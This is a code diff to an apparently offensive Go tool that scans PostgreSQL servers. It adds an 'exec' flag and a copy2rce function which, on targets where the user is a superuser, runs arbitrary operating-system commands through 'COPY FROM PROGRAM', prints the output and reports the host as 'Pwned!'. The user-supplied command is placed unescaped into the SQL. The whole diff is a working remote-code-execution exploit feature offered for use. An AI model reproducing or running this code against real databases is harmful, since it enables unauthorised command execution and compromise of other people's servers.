@@ -28,6 +28,7 @@ func init() {
 	postgresCmd.Flags().StringP("inputlist", "i", "", "inputlist")
 	postgresCmd.Flags().StringP("module", "M", "", "Choose one of module")
 	postgresCmd.Flags().StringP("database", "d", "postgres", "select a database to connect to")
+	postgresCmd.Flags().StringP("exec", "x", "", "execute a command if user is superuser")
 }
 
 // postgresCmd represents the postgres command
@@ -83,11 +84,12 @@ func checkPostgres(target string, wg *sync.WaitGroup, sem chan struct{}, flags m
 		wg.Done()
 	}()
 
-	if flags["port"] == "" {
-		flags["port"] = "5432"
+	port := flags["port"]
+	if port == "" {
+		port = "5432"
 	}
 
-	dbURL := fmt.Sprintf("postgres://%s:%s@%s:%s/%s", flags["user"], flags["password"], target, flags["port"], flags["database"])
+	dbURL := fmt.Sprintf("postgres://%s:%s@%s:%s/%s", flags["user"], flags["password"], target, port, flags["database"])
 	// fmt.Println(dbURL)
 
 	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
@@ -97,12 +99,13 @@ func checkPostgres(target string, wg *sync.WaitGroup, sem chan struct{}, flags m
 	if err != nil {
 		// fmt.Println(err)
 		if (strings.Contains(err.Error(), "password authentication")) || (strings.Contains(err.Error(), "no PostgreSQL user name specified")) {
-			utils.Colorize(utils.ColorBlue, fmt.Sprintf("%s[*] %s:%s - Postgres\n", utils.ClearLine, target, flags["port"]))
+			utils.Colorize(utils.ColorBlue, fmt.Sprintf("%s[*] %s:%s - Postgres\n", utils.ClearLine, target, port))
 		}
-		os.Exit(0)
+		return
 	}
 
 	defer conn.Close(context.Background())
+
 	var isSuperuser bool
 	err = conn.QueryRow(context.Background(), "SELECT rolsuper FROM pg_roles WHERE rolname = current_user").Scan(&isSuperuser)
 	if err != nil {
@@ -110,8 +113,31 @@ func checkPostgres(target string, wg *sync.WaitGroup, sem chan struct{}, flags m
 	}
 
 	if isSuperuser {
-		utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres %sPwned!%s", utils.ClearLine, target, flags["port"], utils.ColorYellow, utils.ColorReset))
+		if flags["exec"] != "" {
+			output := copy2rce(conn, flags["exec"])
+			utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres %sPwned!%s", utils.ClearLine, target, port, utils.ColorYellow, utils.ColorReset))
+			utils.Colorize(utils.ColorYellow, output)
+		} else {
+			utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres %sPwned!%s", utils.ClearLine, target, port, utils.ColorYellow, utils.ColorReset))
+		}
 	} else {
-		utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres\n", utils.ClearLine, target, flags["port"]))
+		utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres\n", utils.ClearLine, target, port))
 	}
+}
+
+func copy2rce(conn *pgx.Conn, cmd string) string {
+	ctx := context.Background()
+	var output string
+
+	conn.Exec(ctx, "CREATE TABLE cmd_exec(cmd_output text);")
+	defer conn.Exec(ctx, "DROP TABLE IF EXISTS cmd_exec;")
+
+	conn.Exec(ctx, fmt.Sprintf("COPY cmd_exec FROM PROGRAM '%s';", cmd))
+	err := conn.QueryRow(ctx, "SELECT * FROM cmd_exec;").Scan(&output)
+
+	if err != nil {
+		fmt.Println("Query failed: ", err)
+	}
+
+	return output
 }
